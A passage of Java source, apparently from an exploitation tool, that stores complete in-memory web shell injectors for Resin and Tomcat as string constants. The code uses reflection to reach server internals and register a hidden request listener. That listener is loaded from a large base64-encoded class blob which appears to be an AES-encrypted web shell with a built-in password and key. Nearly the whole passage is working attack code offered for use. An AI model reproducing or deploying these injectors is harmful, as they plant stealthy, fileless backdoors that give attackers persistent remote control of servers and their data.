AGYAywCXAAEAAABmAL0AcAACAAAAZgC+AMwAAwCMAAAAKwAF/QAQBwDNAfwAHwcAzvoABvoABf8AJAAEBwCNBwDOBwCTBwAqAAEHAI8AIQDPANAAAQB3AAACQgACAAcAAAC/AU0rtgAsEma2ADlOLQS2AD0tK7YAPsAAZ02nAD9OK7YALBJotgA5OgQZBAS2AD0ZBCu2AD46BRkFtgAsEma2ADk6BhkGBLYAPRkGGQW2AD7AAGdNpwAFOgQsxwBjK7YALLYAOxJmtgA5Ti0EtgA9LSu2AD7AAGdNpwBFTiu2ACy2ADsSaLYAOToEGQQEtgA9GQQrtgA+OgUZBbYALLYAOxJmtgA5OgYZBgS2AD0ZBhkFtgA+wABnTacABToELLAABAACABoAHQAbAB4AVABXABsAXQB4AHsAGwB8ALgAuwAbAAMAeAAAAHYAHQAAAMwAAgDPAAwA0AARANEAGgDcAB0A0gAeANQAKQDVAC8A1gA3ANcAQwDYAEkA2QBUANsAVwDaAFkA3QBdAN8AagDgAG8A4QB4AOwAewDiAHwA5ACKAOUAkADmAJgA5wCnAOgArQDpALgA6wC7AOoAvQDuAHkAAACEAA0ADAAOANEApwADACkAKwCHAKcABAA3AB0AowCXAAUAQwARAJoApwAGAB4AOwDSAIgAAwBqAA4A0QCnAAMAigAuAIcApwAEAJgAIACjAJcABQCnABEAmgCnAAYAfABBANIAiAADAAAAvwB6AHsAAAAAAL8A0wBsAAEAAgC9ANQAbgACAIwAAABLAAb/AB0AAwcAjQcAuAcAuQABBwCP/wA5AAQHAI0HALgHALkHAI8AAQcAj/oAAWEHAI//AD8ABAcAjQcAuAcAuQcAjwABBwCP+gABAAEA1QAAAAIA1g==\";\n" +
            "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
            "\n" +
            "            ServletRequestListener listenerObject = (ServletRequestListener) listenerClass.newInstance();\n" +
            "\n" +
            "            // 4.X ListenerConfig | 3.X Listener\n" +
            "            Class ListenerConfigCls = null;\n" +
            "            try {\n" +
            "                ListenerConfigCls = classLoader.loadClass(\"com.caucho.server.webapp.ListenerConfig\");\n" +
            "            } catch (Exception e) {\n" +
            "                ListenerConfigCls = classLoader.loadClass(\"com.caucho.server.webapp.Listener\");\n" +
            "            }\n" +
            "            Object ListenerConfig = ListenerConfigCls.newInstance();\n" +
            "\n" +
            "            Method m1 = ListenerConfig.getClass().getDeclaredMethod(\"setListenerClass\", Class.class);\n" +
            "            m1.setAccessible(true);\n" +
            "            m1.invoke(ListenerConfig, listenerClass);\n" +
            "\n" +
            "            // // 4.X getClass() ListenerConfig  | 3.X getClass().getSuperClass*() Listener\n" +
            "            Method m2 = null;\n" +
            "            try {\n" +
            "                m2 = webapp.getClass().getDeclaredMethod(\"addListener\", ListenerConfig.getClass());\n" +
            "            } catch (Exception e) {\n" +
            "                m2 = webapp.getClass().getSuperclass().getDeclaredMethod(\"addListener\", ListenerConfig.getClass());\n" +
            "            }\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(webapp, ListenerConfig);\n" +
            "\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "}\n";

    public static final String TomcatListenerMemShell =
                    "import java.lang.reflect.Field;\n" +
                    "import java.lang.reflect.Method;\n" +
                    "import java.util.ArrayList;\n" +
                    "import java.util.Arrays;\n" +
                    "import java.util.Iterator;\n" +
                    "import java.util.List;\n" +
                    "\n" +
                    "public class TomcatListenerMemShell {\n" +
                    "\n" +
                    "    public static Object STANDARD_CONTEXT;\n" +
                    "    public static Object RESPONSE;\n" +
                    "    public static Object MEMSHELL_OBJECT;\n" +
                    "    static String ListenerName = \"memshell.TomcatListenerShell\";\n" +
                    "\n" +
                    "    public TomcatListenerMemShell() {\n" +
                    "        try {\n" +
                    "            if (STANDARD_CONTEXT == null) {\n" +
                    "                getStandardContext();\n" +
                    "                getStandardContext1();\n" +
                    "            }\n" +
                    "            if (!isInject()) {\n" +
                    "                injectMemShellClass();\n" +
                    "                injectMemShell();\n" +
                    "            }\n" +
                    "        } catch (Exception var2) {\n" +
                    "\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized boolean isInject() {\n" +
                    "        boolean flag = false;\n" +
                    "        try {\n" +
                    "            Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
                    "            var14.setAccessible(true);\n" +
                    "            Object[] objects = (Object[]) var14.invoke(STANDARD_CONTEXT);\n" +
                    "            for (Object object : objects) {\n" +
                    "                if (object.getClass().getName().equals(ListenerName)) {\n" +
                    "                    flag = true;\n" +
                    "                }\n" +
                    "\n" +
                    "            }\n" +
                    "\n" +
                    "        } catch (Exception e) {\n" +
                    "\n" +
                    "        }\n" +
                    "\n" +
                    "        return flag;\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized void injectMemShell() {\n" +
                    "        try {\n" +
                    "            try {\n" +
                    "                Field var10 = STANDARD_CONTEXT.getClass().getDeclaredField(\"applicationEventListenersObjects\");\n" +
                    "                var10.setAccessible(true);\n" +
                    "                Object[] var12 = (Object[]) ((Object[]) var10.get(STANDARD_CONTEXT));\n" +
                    "                List var13 = Arrays.asList(var12);\n" +
                    "                ArrayList var3 = new ArrayList();\n" +
                    "                Boolean var4 = false;\n" +
                    "                Iterator var5 = var13.iterator();\n" +
                    "\n" +
                    "                while (var5.hasNext()) {\n" +
                    "                    Object var6 = var5.next();\n" +
                    "                    var3.add(var6);\n" +
                    "                    if (var6.getClass().getName().equals(ListenerName)) {\n" +
                    "                        var4 = true;\n" +
                    "                    }\n" +
                    "                }\n" +
                    "\n" +
                    "                if (!var4) {\n" +
                    "                    var3.add(MEMSHELL_OBJECT);\n" +
                    "                    Method var14 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"setApplicationEventListeners\", Object[].class);\n" +
                    "                    var14.setAccessible(true);\n" +
                    "                    var14.invoke(STANDARD_CONTEXT, (Object) var3.toArray());\n" +
                    "                }\n" +
                    "            } catch (Exception var8) {\n" +
                    "                Method var11 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"addApplicationListener\", String.class);\n" +
                    "                var11.invoke(STANDARD_CONTEXT, ListenerName);\n" +
                    "                Method var2 = STANDARD_CONTEXT.getClass().getDeclaredMethod(\"addApplicationEventListener\", Object.class);\n" +
                    "                var2.setAccessible(true);\n" +
                    "                var2.invoke(STANDARD_CONTEXT, MEMSHELL_OBJECT);\n" +
                    "            }\n" +
                    "\n" +
                    "        } catch (Throwable var9) {\n" +
                    "            Throwable var0 = var9;\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
                    "        Field var2 = null;\n" +
                    "        Class var3 = var0.getClass();\n" +
                    "\n" +
                    "        while (var3 != Object.class) {\n" +
                    "            try {\n" +
                    "                var2 = var3.getDeclaredField(var1);\n" +
                    "                break;\n" +
                    "            } catch (NoSuchFieldException var5) {\n" +
                    "                var3 = var3.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "        if (var2 == null) {\n" +
                    "            throw new NoSuchFieldException(var1);\n" +
                    "        } else {\n" +
                    "            var2.setAccessible(true);\n" +
                    "            return var2.get(var0);\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private void getStandardContext1() {\n" +
                    "        try {\n" +
                    "            Object request = Class.forName(\"com.opensymphony.webwork.ServletActionContext\").getMethod(\"getRequest\").invoke(null);\n" +
                    "            Object servletContext = invokeMethod(request, \"getServletContext\");\n" +
                    "            STANDARD_CONTEXT =  getFV(getFV(servletContext,\"context\"), \"context\");\n" +
                    "        } catch (Exception e) {\n" +
                    "        }\n" +
                    "    }\n" +
                    "\n" +
                    "    private Object invokeMethod(Object obj,String methodName,Object... parameters){\n" +
                    "        try {\n" +
                    "            ArrayList classes = new ArrayList();\n" +
                    "            if (parameters!=null){\n" +
                    "                for (int i=0;i<parameters.length;i++){\n" +
                    "                    Object o1=parameters[i];\n" +
                    "                    if (o1!=null){\n" +
                    "                        classes.add(o1.getClass());\n" +
                    "                    }else{\n" +
                    "                        classes.add(null);\n" +
                    "                    }\n" +
                    "                }\n" +
                    "            }\n" +
                    "            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));\n" +
                    "\n" +
                    "            return method.invoke(obj, parameters);\n" +
                    "        }catch (Exception e){\n" +
                    "//        \te.printStackTrace();\n" +
                    "        }\n" +
                    "        return null;\n" +
                    "    }\n" +
                    "    private Method getMethodByClass(Class cs,String methodName,Class... parameters){\n" +
                    "        Method method=null;\n" +
                    "        while (cs!=null){\n" +
                    "            try {\n" +
                    "                method=cs.getMethod(methodName, parameters);\n" +
                    "                cs=null;\n" +
                    "            }catch (Exception e){\n" +
                    "                cs=cs.getSuperclass();\n" +
                    "            }\n" +
                    "        }\n" +
                    "        return method;\n" +
                    "    }\n" +
                    "    public static synchronized void getStandardContext() throws Exception {\n" +
                    "        boolean var0 = false;\n" +
                    "        Thread[] var1 = (Thread[]) ((Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\"));\n" +
                    "\n" +
                    "        for (int var2 = 0; var2 < var1.length; ++var2) {\n" +
                    "            Thread var3 = var1[var2];\n" +
                    "            if (var3 != null) {\n" +
                    "                String var4 = var3.getName();\n" +
                    "//                if (!var4.contains(\"exec\") && var4.contains(\"http\")) {\n" +
                    "                try {\n" +
                    "                    if (var4.startsWith(\"http\")) {\n" +
                    "                        Object var5 = getFV(var3, \"target\");\n" +
                    "                        if (var5 instanceof Runnable) {\n" +
                    "                            Object var6;\n" +
                    "                            try {\n" +
                    "                                var6 = getFV(getFV(getFV(var5, \"this$0\"), \"handler\"), \"global\");\n" +
                    "                            } catch (Exception var17) {\n" +
                    "                                continue;\n" +
                    "                            }\n" +
                    "\n" +
                    "                            List var7 = (List) getFV(var6, \"processors\");\n" +
                    "\n" +
                    "                            for (int var8 = 0; var8 < var7.size(); ++var8) {\n" +
                    "                                Object var9 = getFV(var7.get(var8), \"req\");\n" +
                    "                                RESPONSE = var9.getClass().getMethod(\"getResponse\", (Class[]) (new Class[0])).invoke(var9);\n" +
                    "\n" +
                    "                                Object var10 = var9.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(var9, 1);\n" +
                    "\n" +
                    "                                try {\n" +
                    "                                    Field var11 = var10.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var11.setAccessible(true);\n" +
                    "                                    STANDARD_CONTEXT = var11.get(var10);\n" +
                    "                                } catch (Exception var16) {\n" +
                    "                                    Object var12 = var10.getClass().getDeclaredMethod(\"getServletContext\").invoke(var10);\n" +
                    "                                    Field var13 = var12.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var13.setAccessible(true);\n" +
                    "                                    Object var14 = var13.get(var12);\n" +
                    "                                    Field var15 = var14.getClass().getDeclaredField(\"context\");\n" +
                    "                                    var15.setAccessible(true);\n" +
                    "                                    STANDARD_CONTEXT = var15.get(var14);\n" +
                    "                                }\n" +
                    "                                if (STANDARD_CONTEXT != null) {\n" +
                    "                                    var0 = true;\n" +
                    "                                    break;\n" +
                    "                                }\n" +
                    "\n" +
                    "                            }\n" +
                    "\n" +
                    "                            if (var0) {\n" +
                    "                                break;\n" +
                    "                            }\n" +
                    "                        }\n" +
                    "                    }\n" +
                    "                } catch (Exception e) {\n" +
                    "                }\n" +
                    "            }\n" +
                    "        }\n" +
                    "\n" +
                    "    }\n" +
                    "\n" +
                    "    public static void injectMemShellClass() {\n" +
                    "        try {\n" +
                    "            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(ListenerName).newInstance();\n" +
                    "        } catch (Exception var5) {\n" +
                    "            try {\n" +
                    "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
                    "                var1.setAccessible(true);\n" +
                    "                byte[] var2 = base64Decode(\"yv66vgAAADMBYgoAYgC5CQBJALoJAEkAuwgAvAkASQC9CAC+CQBJAL8IAMAJAEkAwQcAwgoACgC5CgAKAMMKAAoAxAoASQDFCQBJAMYIAMcJAEkAyAoAYgDJCgBiAMoIAMsKAMwAzQcAzgoAMQDPCgAWANAKAMwA0QoAzADSBwDTCADUCgDVANYKADEA1woA1QDYBwDZCgDVANoKACAA2woAIADcCgAxAN0IAN4KAC4A3wgA4AcA4QoALgDiBwDjCgDkAOUKADAA5ggA5wcA6AcAewcA6QcA6ggA6woALgDsCADtCADuCADvCADwCADxCwBgAPILAGAA8woA9AD1BwD2CgBJAPcIAPgLADwA+QgA+goAMQD7CgBJAPwLADwA/QsAPAD+CgBJAP8KAEkBAAgBAQsBAgEDBwEECgAuAQUKAEkAyQoASQEGCwECAQcIAQgLADwBBwcBCQoAUAC5CgAwAQoKADEBCwoBDAENCgAwAMQKAFABDgoASQEPCgAxARAIAREIARIKABsBEwgAZgoALgEUCgEVARYKARUBFwcBGAgAZAcBGQcBGgEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1RvbWNhdExpc3RlbmVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwEEBwEbBwDTAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA6gEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEACWdldFdyaXRlcgEAOihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KUxqYXZhL2lvL1dyaXRlcjsBAANvdXQBABBMamF2YS9pby9Xcml0ZXI7BwEYBwEcAQAQcmVxdWVzdERlc3Ryb3llZAEAJihMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OylWAQADcmVxAQAjTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDsBABJyZXF1ZXN0SW5pdGlhbGl6ZWQBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5BwEdBwD2BwEeAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEdmFyNQEABHZhcjgBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBABhUb21jYXRMaXN0ZW5lclNoZWxsLmphdmEMAG4AbwwAZABlDABmAGcBABAzYzZlMGI4YTljMTUyMjRhDABoAGkBAARwQVMzDABqAGkBABAvZmF2aWNvbmRlbW8uaWNvDABrAGkBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBHwEgDAEhASIMAGwAiQwAbABpAQAFVVRGLTgMAG0AaQwAbgB1DAEjASQBAANBRVMHARsMASUBJgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAScBKAwAbgEpDAEqASsMASwBLQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAS4MASUBLwwBMAExDAEyATMBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBNAEoDABuATUMASEBNgwBNwEiAQAQamF2YS51dGlsLkJhc2U2NAwBOAE5AQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBOgE7AQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBPAwBPQE+DAE/AUABAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBQQFCAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAUMAbwwAmgFEBwEdDAFFAUYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACvALABABBYLVJlcXVlc3RlZC1XaXRoDAFHAIkBAA5YTUxIVFRQUmVxdWVzdAwBSAFJDACaAJsMAUoBSwwBTACJDACXAJgMAHwAfQEAEG1lbXNoZWxsLnBheWxvYWQHAR4MAU0BTgEAHG1lbXNoZWxsL1RvbWNhdExpc3RlbmVyU2hlbGwMAU8BUAwAeAB5DAFRAVIBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAVMBVAwBVQFWBwEcDAFXAVgMAVkBKAwAjQCODAFVATYBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAVoAbwwBWwFcBwFdDAFeAV8MAWABYQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdExpc3RlbmVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEADmphdmEvaW8vV3JpdGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAVyZXNldAEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACWdldEhlYWRlcgEAB2luZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEADGdldFBhcmFtZXRlcgEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQALdG9CeXRlQXJyYXkBAA9wcmludFN0YWNrVHJhY2UBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7ACEASQBiAAEAYwAHAAEAZABlAAAAAQBmAGcAAAAAAGgAaQAAAAEAagBpAAAAAQBrAGkAAAAAAGwAaQAAAAEAbQBpAAAACwABAG4AbwABAHAAAACQAAMAAQAAAEYqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBxAAAAJgAJAAAAGwAEABMACQAUAA4AFQAUABYAGgAXACAAHAA/AB0ARQAeAHIAAAAMAAEAAABGAHMAdAAAAAEAbgB1AAEAcAAAAJsAAwACAAAARyortwASKgG1AAIq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